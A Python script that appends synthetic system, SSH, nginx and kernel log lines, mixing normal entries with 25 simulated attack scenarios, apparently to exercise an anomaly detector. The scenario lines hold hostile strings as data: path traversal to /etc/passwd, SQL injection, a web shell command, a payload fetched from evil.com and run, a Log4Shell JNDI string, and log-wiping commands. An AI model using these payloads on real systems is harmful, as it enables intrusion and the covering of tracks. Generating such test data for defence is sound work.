import random
import datetime
import time
import sys
import os

# --- Helper Functions (from your original script) ---
def random_ip():
    return ".".join(str(random.randint(1, 255)) for _ in range(4))

def random_port():
    return random.randint(1024, 65535)

def random_user():
    return random.choice(['fztu', 'root', 'ubuntu', 'admin', 'test', 'guest', 'oracle', 'backup', 'webmaster', 'chen', 'pgadmin', 'matlab', '123'])

def random_pid():
    return random.randint(1000, 30000)

def random_hostname():
    return random.choice(['LabSZ', 'server', 'prod1', 'testvm', 'RUfus', 'archive', 'ADM'])

def random_number():
    return random.randint(1, 99)

# --- Log Writing Class ---
class LogWriter:
    """
    A helper class to handle writing logs to multiple files and
    randomly switching between them.
    """
    def __init__(self, log_dir):
        self.log_dir = log_dir
        self.log_files = {
            "auth": os.path.join(log_dir, "auth.log"),
            "kern": os.path.join(log_dir, "kern.log"),
            "nginx": os.path.join(log_dir, "nginx.log"),
            "pacman": os.path.join(log_dir, "pacman.log"),
            "system": os.path.join(log_dir, "system.log"),
            "xorg": os.path.join(log_dir, "Xorg.0.log"),
            "firewall": os.path.join(log_dir, "firewall.log"),
            "app": os.path.join(log_dir, "app.log")
        }
        # Ensure all log files exist
        for f in self.log_files.values():
            open(f, 'a').close()

    def write_log(self, service, message):
        """Formats and writes a log entry to the appropriate file."""
        log_type_map = {
            "sshd": "auth",
            "sudo": "auth",
            "useradd": "auth",
            "passwd": "auth",
            "kernel": "kern",
            "nginx": "nginx",
            "pacman": "pacman",
            "systemd": "system",
            "bash": "system",
            "Xorg.0.log": "xorg",
            "firewall": "firewall", 
            "myapp": "app"
        }
        log_key = log_type_map.get(service, "system") # Default to system.log
        target_file = self.log_files[log_key]

        timestamp = datetime.datetime.now().strftime("%b %d %H:%M:%S")
        hostname = random_hostname()
        pid = random_pid()
        full_log = f"{timestamp}\t{hostname}\t{service}[{pid}]:\t{message}\n"
        print(f"✏️  ({os.path.basename(target_file)}) {full_log.strip()}")
        with open(target_file, "a") as f:
            f.write(full_log)
        time.sleep(random.uniform(0.5, 1.5)) # Realistic delay

# ===============================================================
# ===         25 REAL-WORLD ATTACK SCENARIOS                  ===
# ===============================================================

def scenario_1_ssh_brute_force(writer: LogWriter):
    print("\n--- 💣 Running Scenario 1: SSH Brute-Force Attack ---")
    attacker_ip = random_ip()
    target_user = random.choice(['root', 'admin', 'ubuntu'])
    for _ in range(random.randint(5, 10)):
        # 
        writer.write_log("sshd", f"Failed password for invalid user {random_user()} from {attacker_ip} port {random_port()}")
    for _ in range(random.randint(3, 5)):
        # 
        writer.write_log("sshd", f"Failed password for {target_user} from {attacker_ip} port {random_port()}")
    writer.write_log("sshd", f"Accepted password for {target_user} from {attacker_ip} port {random_port()}")

def scenario_2_privilege_escalation(writer: LogWriter):
    print("\n--- 💣 Running Scenario 2: Privilege Escalation ---")
    attacker_ip = random_ip()
    user = random_user()
    num = random_number()
    writer.write_log("sshd", f"Accepted password for {user} from {attacker_ip} port {random_port()}")
    # 
    writer.write_log("sudo", f"{user} : TTY=pts/0 ; PWD=/home/{user} ; USER=root ; COMMAND=/bin/bash")
    # 
    writer.write_log("kernel", f"process '/bin/bash' started by user {num}")

def scenario_3_web_directory_traversal(writer: LogWriter):
    print("\n--- 💣 Running Scenario 3: Web Directory Traversal ---")
    attacker_ip = random_ip()
    # 
    writer.write_log("nginx", f'{attacker_ip} - - [{datetime.datetime.now()}] "GET /index.php?page=../../../../etc/passwd HTTP/1.1" 404')
    # 
    writer.write_log("nginx", f'{attacker_ip} - - [{datetime.datetime.now()}] "GET /api/v1/users?id=\' OR 1=1 -- HTTP/1.1" 500')

def scenario_4_web_shell_upload(writer: LogWriter):
    print("\n--- 💣 Running Scenario 4: Web Shell Upload & Execution ---")
    attacker_ip = random_ip()
    writer.write_log("nginx", f'{attacker_ip} - - [{datetime.datetime.now()}] "POST /uploads/upload.php HTTP/1.1" 200')
    # 
    writer.write_log("nginx", f'{attacker_ip} - - [{datetime.datetime.now()}] "GET /uploads/shell.php?cmd=whoami HTTP/1.1" 200')
    # 
    writer.write_log("kernel", "process '/usr/bin/php' spawned child '/bin/sh'")

def scenario_5_kernel_panic_sequence(writer: LogWriter):
    # 
    print("\n--- 💣 Running Scenario 5: Kernel Panic Sequence ---")
    writer.write_log("kernel", "BUG: unable to handle kernel NULL pointer dereference at (nil)")
    writer.write_log("kernel", "Oops: 0000 [#1] SMP PTI")
    writer.write_log("kernel", "Kernel panic - not syncing: Fatal exception in interrupt")

def scenario_6_segmentation_fault(writer: LogWriter):
    # 
    print("\n--- 💣 Running Scenario 6: Application Segmentation Fault ---")
    writer.write_log("myapp", f"segfault at 0 ip 00007f... sp 00007f... error 4 in libc-2.31.so")
    writer.write_log("systemd", "myapp.service: Main process exited, code=killed, status=11/SEGV")

def scenario_7_rogue_package_install(writer: LogWriter):
    print("\n--- 💣 Running Scenario 7: Rogue Package Installation ---")
    writer.write_log("pacman", "Running transaction")
    # 
    writer.write_log("pacman", "Installed nmap (7.91-1)") # A network scanner
    # 
    writer.write_log("pacman", "Installed netcat (1.10-7)") # A networking utility often used in attacks

def scenario_8_port_scanning(writer: LogWriter):
    print("\n--- 💣 Running Scenario 8: Port Scanning ---")
    attacker_ip = random_ip()
    for port in [21, 22, 80, 443, 3306, 8080, 5432, 25]:
        # 
        writer.write_log("kernel", f"Firewall: *TCP_IN Blocked* IN=eth0 OUT= MAC=... SRC={attacker_ip} DST=... PROTO=TCP SPT={random_port()} DPT={port}")

def scenario_9_data_exfiltration(writer: LogWriter):
    print("\n--- 💣 Running Scenario 9: Data Exfiltration ---")
    user = random_user()
    # 
    writer.write_log("sudo", f"{user} : TTY=pts/1 ; PWD=/var/www ; USER=root ; COMMAND=/bin/tar czf /tmp/backup.tar.gz .")
    writer.write_log("kernel", "Outbound connection to 104.22.60.184:443 established")
    writer.write_log("systemd", f"User {user} sent 1.5GB of data to {random_ip()}")

def scenario_10_living_off_the_land(writer: LogWriter):
    print("\n--- 💣 Running Scenario 10: Living Off The Land ---")
    attacker_ip = random_ip()
    writer.write_log("kernel", f"process '/usr/bin/curl' started by user {random_user()}")
    # 
    writer.write_log("nginx", f'{attacker_ip} - - [{datetime.datetime.now()}] "GET http://evil.com/payload.sh" 200')
    writer.write_log("kernel", f"process '/bin/chmod' started by user {random_user()} with args: +x payload.sh")
    # 
    writer.write_log("kernel", f"process '/bin/sh' started by user {random_user()} with args: payload.sh")

def scenario_11_clearing_tracks(writer: LogWriter):
    # 
    print("\n--- 💣 Running Scenario 11: Clearing Tracks ---")
    user = random_user()
    writer.write_log("sudo", f"{user} : TTY=pts/2 ; PWD=/home/{user} ; USER=root ; COMMAND=/usr/bin/rm /var/log/auth.log")
    writer.write_log("bash", "history -c")

def scenario_12_rogue_user_creation(writer: LogWriter):
    # 
    print("\n--- 💣 Running Scenario 12: Rogue User Creation ---")
    new_user = "hacker"
    writer.write_log("useradd", f"new user: name={new_user}, UID=1001, GID=1001, home=/{new_user}, shell=/bin/bash")
    writer.write_log("passwd", f"password for user '{new_user}' changed")

def scenario_13_application_dos(writer: LogWriter):
    print("\n--- 💣 Running Scenario 13: Application-Level DoS ---")
    attacker_ip = random_ip()
    for _ in range(30):
        writer.write_log("nginx", f'{attacker_ip} - - [{datetime.datetime.now()}] "GET /login.php HTTP/1.1" 200')
        time.sleep(0.05) # Very rapid requests

def scenario_14_xorg_errors(writer: LogWriter):
    print("\n--- 💣 Running Scenario 14: Critical Xorg Errors ---")
    writer.write_log("Xorg.0.log", "(EE) Backtrace:")
    # 
    writer.write_log("Xorg.0.log", "(EE) Caught signal 11 (Segmentation fault). Server aborting")

def scenario_15_invalid_user_probing(writer: LogWriter):
    print("\n--- 💣 Running Scenario 15: Invalid User Probing ---")
    attacker_ip = random_ip()
    for user in ['test', 'guest', 'oracle', 'backup', 'deploy', 'user1', 'api', 'dbuser']:
        # 
        writer.write_log("sshd", f"Invalid user {user} from {attacker_ip} port {random_port()}")

def scenario_16_credential_stuffing(writer: LogWriter):
    print("\n--- 💣 Running Scenario 16: Credential Stuffing ---")
    attacker_ip = random_ip()
    for user in ['admin', 'jdoe', 'support', 'dev', 'test']:
        # 
        writer.write_log("sshd", f"Failed password for {user} from {attacker_ip} port {random_port()}")
        time.sleep(0.5)
    writer.write_log("sshd", f"Accepted password for support from {attacker_ip} port {random_port()}")

def scenario_17_dns_tunneling(writer: LogWriter):
    # 
    print("\n--- 💣 Running Scenario 17: DNS Tunneling Exfiltration ---")
    attacker_domain = "exfil.hacker-domain.com"
    writer.write_log("systemd", f"DNS query for long-base64-string-of-data.{attacker_domain} from 127.0.0.1")
    writer.write_log("systemd", f"DNS query for another-long-base64-string.{attacker_domain} from 127.0.0.1")

def scenario_18_scheduled_task_persistence(writer: LogWriter):
    print("\n--- 💣 Running Scenario 18: Scheduled Task for Persistence ---")
    user = random_user()
    # 
    writer.write_log("systemd", f"User {user} added a new cron job: /tmp/backdoor.sh")
    writer.write_log("kernel", "process '/bin/chmod' started by user root with args: +x /tmp/backdoor.sh")

def scenario_19_process_injection(writer: LogWriter):
    # 
    print("\n--- 💣 Running Scenario 19: Process Injection ---")
    writer.write_log("kernel", "ptrace attach to process 1234 (systemd) by process 5678 (malware)")
    writer.write_log("kernel", "Virtual memory modification detected in process 1234 by pid 5678")

def scenario_20_command_and_control_beaconing(writer: LogWriter):
    print("\n--- 💣 Running Scenario 20: C2 Beaconing ---")
    attacker_ip = random_ip()
    for _ in range(5):
        writer.write_log("firewall", f"Outbound connection allowed to {attacker_ip}:443 from internal host")
        time.sleep(random.uniform(5, 15)) # Mimics regular beaconing interval

def scenario_21_masquerading_as_system_process(writer: LogWriter):
    print("\n--- 💣 Running Scenario 21: Masquerading ---")
    writer.write_log("systemd", "Starting process /usr/bin/kthreadd but it is not the real kthreadd")
    # 
    writer.write_log("kernel", "Process 'kthreadd' (PID {pid}) opened a network socket to {ip}:{port}")

def scenario_22_log4shell_exploitation(writer: LogWriter):
    print("\n--- 💣 Running Scenario 22: Log4Shell Exploitation ---")
    attacker_ip = random_ip()
    # 
    writer.write_log("myapp", f"Received request with suspicious User-Agent: ${{jndi:ldap://{attacker_ip}/a}}")
    writer.write_log("kernel", f"process '/bin/java' started child '/bin/bash'")

def scenario_23_lateral_movement_smb(writer: LogWriter):
    print("\n--- 💣 Running Scenario 23: Lateral Movement (SMB) ---")
    source_host = "WEB-PROD-01"
    dest_host = "DB-PROD-01"
    # 
    writer.write_log("systemd", f"SMB connection attempt from {source_host} to {dest_host} as user ADMIN")
    writer.write_log("systemd", f"PsExec service started on {dest_host}")

def scenario_24_rootkit_installation(writer: LogWriter):
    # 
    print("\n--- 💣 Running Scenario 24: Rootkit Installation ---")
    writer.write_log("kernel", "Loading kernel module 'evil_module.ko'")
    writer.write_log("kernel", "Tainted kernel: a module has been loaded")
    writer.write_log("bash", "system command 'ls' replaced with '/tmp/.hidden_ls'")

def scenario_25_ransomware_activity(writer: LogWriter):
    print("\n--- 💣 Running Scenario 25: Ransomware Activity ---")
    writer.write_log("kernel", "Process 'encryptor.exe' (PID {pid}) is rapidly reading and writing files in /home/user/documents")
    writer.write_log("kernel", "File 'document.pdf' deleted")
    # 
    writer.write_log("kernel", "File 'document.pdf.ENCRYPTED' created")
    # 
    writer.write_log("systemd", "Shadow copies deleted by process 'encryptor.exe'")

# --- Main Simulation Loop ---
def generate_normal_log(writer: LogWriter):
    """Generates a single, normal log entry."""
    tpl = random.choice([
        "pam_unix(sshd:session): session closed for user {user}",
        "pam_unix(sshd:session): session opened for user {user} by (uid={num})",
        "Received disconnect from {ip}: {num}: Bye Bye [preauth]",
        "Connection closed by {ip} [preauth]",
        "systemd: Started User Session {pid} of user {user}.",
        "kernel: usb 1-{num}: USB disconnect, device number 2",
        "Received disconnect from {ip}: {num}: Closed due to user request [preauth]",
        "event{num}  - Sleep Button: is tagged by udev as: Keyboard",
        "config/udev: Adding input device 2.4G Mouse (/dev/input/event{num})",
        "Option-'config_info' 'udev:/sys/devices/pci0000:00/0000:00:{num}.0/usb3/3-4/3-4:1.0/0003:1EA7:00{num}6.0001/input/input{num}/event{num}",
        "GXT7863:00 27C6:01E0 Touchpad: (accel) acceleration factor: 2.000",
        "Received disconnect from {ip}: {num}: disconnected by user",
        "Did not receive identification string from {ip}",
        "Accepted password for {user} from {ip} port {port} ssh{num}",

    ])
    writer.write_log(random.choice(['sshd', 'systemd', 'kernel', 'Xorg.0.log']), tpl.format(user=random_user(), ip=random_ip(), pid=random_pid(), num=random_number(), port=random_port()))

def generate_anomaly_log(writer: LogWriter):
    tpl = random.choice([
        "reverse mapping checking getaddrinfo for ns.randomdomain.com [{ip}] failed - POSSIBLE BREAK-IN ATTEMPT!",
        "Invalid user {user} from {ip}",
        "input_userauth_request: invalid user {user} [preauth]",
        "pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost={ip}",
        "pam_unix(sshd:auth): authentication failure; logname= uid={try2} euid={try1} tty=ssh ruser= rhost={ip}",
        "Failed password for invalid user {user} from {ip} port {port} ssh{try0}",
        "message repeated {num} times: [ Failed password for root from {ip} port {port} ssh{try0}]",
        "Disconnecting: Too many authentication failures for {user} [preauth]",
        "PAM {num} more authentication failures; logname= uid={try1} euid={try2} tty=ssh ruser= rhost={ip}  user={user}",
        "fatal: Read from socket failed: Connection reset by peer",
        "error: maximum authentication attempts exceeded for {user} from {ip} port {port}",
        "error: Received disconnect from {ip}: {port}: com.jcraft.jsch.JSchException: Auth fail [preauth]",
        "error: Received disconnect from {ip}: {port}: No more user authentication methods available. [preauth]",
        "Failed none for invalid user {try1} from {ip} port {port} ssh{try0}",
        "Failed password for user {user} from {ip} port {port} ssh{try2}",
        "fatal: Write failed: Connection reset by peer [preauth]",
        "sudo: user{try1}: command not allowed ; TTY=pts/1 ; PWD=/home/user{try0} ; USER=root ; COMMAND=/bin/cat /etc/shadow",
        "sudo: pam_unix(sudo:auth): authentication failure; logname={user}{try1} uid={rand} euid={try0} tty=/dev/pts/2 ruser=user1 rhost=  user=root",
        "sudo: {user} : 3 incorrect password attempts ; TTY=pts/2 ; PWD=/home/user2 ; USER=root ; COMMAND=/usr/bin/vim /etc/sudoers",
        "myservice[{rand}]: segfault at 000000000000 ip 00007f0a4e4b623a sp 00007ffde1e08a50 error {try1} in libc-{try2}.{num}.so[{rand}]",
        "kernel: myapp[{rand}]: segfault at 7f0a00000000 ip 00007f0a4e4c0000 sp 00007ffde1e07000 error {try0} in libpthread-{try1}.{num}.so[7f0a4e480000+19000]",
        "systemd[1]: myapp.service: Main process exited, code=killed, status={num}/SEGV",
        "kernel: [12345.{rand}] Kernel panic - not syncing: Fatal exception",
        "kernel: [12346.{rand}] Kernel panic - attempted to kill init! exitcode=0x00000009",
        "kernel: panic occurred, switching back to text console"
    ])
    writer.write_log(random.choice(['sshd', 'systemd', 'kernel', 'Xorg.0.log', 'sudo']), 
tpl.format(user=random_user(), 
            ip=random_ip(), 
            pid=random_pid(), 
            num=random_number(), 
            port=random_port(),
            try0=random.randint(1, 9),
            try1=random.randint(1, 4),
            try2=random.randint(5, 9),
            count=random.randint(1, 10),
            rand=random.randint(123450, 987650)))

if __name__ == "__main__":
    BASE_DIR = os.path.abspath(os.path.join(os.path.dirname(__file__), '..'))
    DEFAULT_LOG_DIR = os.path.join (BASE_DIR, "simulation")

    # Check if a directory was provided as a command-line argument
    if len(sys.argv) > 1:
        log_directory = sys.argv[1]
        print(f"Using provided log directory: {log_directory}")
    else:
        # If not, use the default
        log_directory = DEFAULT_LOG_DIR
        print(f"No directory provided. Using default: {log_directory}")
    # if len(sys.argv) < 2:
    #     print("Usage: python attack_simulator.py <path_to_simulation_log_directory>")
    #     sys.exit(1)

    # log_directory = sys.argv[1]
    os.makedirs(log_directory, exist_ok=True)
    writer = LogWriter(log_directory)

    attack_scenarios = [
        scenario_1_ssh_brute_force, scenario_2_privilege_escalation,
        scenario_3_web_directory_traversal, scenario_4_web_shell_upload,
        scenario_5_kernel_panic_sequence, scenario_6_segmentation_fault,
        scenario_7_rogue_package_install, scenario_8_port_scanning,
        scenario_9_data_exfiltration, scenario_10_living_off_the_land,
        scenario_11_clearing_tracks, scenario_12_rogue_user_creation,
        scenario_13_application_dos, scenario_14_xorg_errors,
        scenario_15_invalid_user_probing, scenario_16_credential_stuffing, 
        scenario_17_dns_tunneling, scenario_18_scheduled_task_persistence,
        scenario_19_process_injection, scenario_20_command_and_control_beaconing, 
        scenario_21_masquerading_as_system_process, scenario_22_log4shell_exploitation, 
        scenario_23_lateral_movement_smb, scenario_24_rootkit_installation,
        scenario_25_ransomware_activity, generate_anomaly_log
    ]

    print(f"Starting advanced anomaly simulation. Writing to directory: {log_directory}")
    try:
        while True:
            # 80% chance for normal logs, 200% chance for an attack
            if random.random() < 0.8:
                generate_normal_log(writer)
                time.sleep(random.uniform(1, 3))
            else:
                random.choice(attack_scenarios)(writer)
                print("--- Scenario Complete. Resuming operations ---")
                time.sleep(random.uniform(5, 12))

    except KeyboardInterrupt:
        print("\n🛑 Stopped anomaly simulation.")